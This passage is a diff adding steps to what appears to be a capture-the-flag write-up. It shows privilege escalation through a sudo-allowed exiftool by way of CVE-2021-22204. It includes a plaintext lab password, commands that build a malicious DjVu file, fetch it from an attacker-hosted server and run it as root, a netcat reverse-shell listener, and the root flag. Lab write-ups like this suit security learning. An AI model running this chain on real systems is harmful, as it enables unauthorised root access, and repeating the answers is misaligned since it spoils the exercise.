@@ -407,6 +407,82 @@ stux@ubuntu:~$
 
 <br>
 
+> 1.10. <em>What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000</em><br><a id='1.10'></a>
+>> <strong><code>CVE-2021-22204</code></strong><br>
+<p></p>
+
+<p><code>stux</code> : <code>p4ssw0rdhack3d!123</code></p>
+
+```bash
+stux@ubuntu:~$ sudo -l
+Matching Defaults entries for stux on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User stux may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/local/bin/exiftool
+stux@ubuntu:~$ 
+```
+
+![image](https://github.com/user-attachments/assets/87dbeb7b-3bd9-49f0-b28b-4eccdc909c9c)
+
+
+<br>
+
+> 1.11. <em>What is the utility used to create the PoC file?</em><br><a id='1.11'></a>
+>> <strong><code>djvumake</code></strong><br>
+<p></p>
+
+
+```bash
+:~# git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
+...
+:~/CVE-2021-22204-exiftool# apt install djulibre-bin
+...
+:~/CVE-2021-22204-exiftool# bzz payload payload.bzz
+:~/CVE-2021-22204-exiftool# djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
+:~/CVE-2021-22204-exiftool# 
+```
+
+```bash
+:~/CVE-2021-22204-exiftool# python3 exploit.py
+    1 image files updated
+```
+
+<p>imagecmspit.jpg</p>
+
+```bash
+:~/CVE-2021-22204-exiftool# python3 -m http.server
+```
+
+```bash
+stux@ubuntu:/tmp$ wget http://10.10.19.210:8000/exploit.djvu
+...
+stux@ubuntu:/tmp$ sudo /usr/local/bin/exiftool exploit.djvu
+```
+
+<br>
+
+> 1.12. <em>Escalate your privileges. What is the flag in root.txt?</em><br><a id='1.12'></a>
+>> <strong><code>thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}</code></strong><br>
+<p></p>
+
+```bash
+:~/CVE-2021-22204-exiftool# nc -nlvp 9090
+...
+# whoami
+root
+# pwd
+/tmp
+# ls /root
+root.txt
+# cat /root/root.txt
+thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
+```
+
+
+![image](https://github.com/user-attachments/assets/31ad4101-7799-4dd7-ad65-beb3a3f9297e)
+
 
 
 <p>Logged in as <code>admin</code> again.<br>
